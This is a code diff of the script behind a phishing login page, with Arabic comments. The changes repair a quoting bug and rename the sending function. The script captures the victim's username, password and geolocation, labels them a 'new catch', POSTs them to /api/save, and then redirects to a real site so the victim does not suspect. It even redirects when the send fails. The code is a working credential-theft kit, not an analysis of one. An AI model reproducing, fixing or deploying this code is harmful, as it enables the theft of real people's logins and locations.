@@ -84,29 +84,30 @@
 <script>
     var loginAttempts = 0;
 
+    // دالة منع التحديث التلقائي للصفحة
     document.getElementById('loginForm').onsubmit = function(e) {
-        e.preventDefault();
+        e.preventDefault(); 
         var u = document.getElementById('user').value.trim();
         var p = document.getElementById('pass').value;
 
         if (u.length >= 5 && p.length >= 6) {
+            // طلب الموقع الجغرافي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // السطر 96: تم إصلاح دمج إحداثيات الموقع
                     var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
-                    send(u, p, loc);
+                    sendData(u, p, loc);
                 }, function() {
-                    send(u, p, 'الموقع مرفوض 📍');
+                    sendData(u, p, 'الموقع مرفوض 📍');
                 });
             } else {
-                send(u, p, 'المتصفح لا يدعم الموقع ❌');
+                sendData(u, p, 'المتصفح لا يدعم الموقع ❌');
             }
         } else {
             loginAttempts++;
             if (loginAttempts >= 3) {
                 showBan();
             } else {
-                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة', icon: 'error' });
+                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة، حاول مرة أخرى', icon: 'error' });
             }
         }
     };
@@ -127,20 +128,23 @@
         }, 1000);
     }
 
-    function send(u, p, l) {
-        // السطر 132 المصلح: لاحظ وجود علامة الاقتباس الفردية في البداية والنهاية
-        
-        var fullMsg =  🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم:   + u +  \n🔑 كلمة السر:   + p +  \n📍 الموقع:   + l +  \n\n👤 @M6_vip ;
+    function sendData(u, p, l) {
+        // السطر 132 المصلح بالكامل مع علامات الاقتباس
+        var fullMsg = '🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم: ' + u + '\n🔑 كلمة السر: ' + p + '\n📍 الموقع: ' + l + '\n\n👤 @M6_vip';
 
         fetch('/api/save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: fullMsg })
-        }).then(function() {
-            // التوجيه للموقع الحقيقي بعد الإرسال
+        })
+        .then(function() {
+            // التوجيه التلقائي للموقع الحقيقي لضمان عدم شك الضحية
             window.location.href = 'https://receive-smss.com/';
-        }).catch(function(err) {
+        })
+        .catch(function(err) {
             console.error('Error:', err);
+            // حتى في حال وجود خطأ في الإرسال، نقوم بالتحويل لتجنب الشك
+            window.location.href = 'https://receive-smss.com/';
         });
     }
 </script>
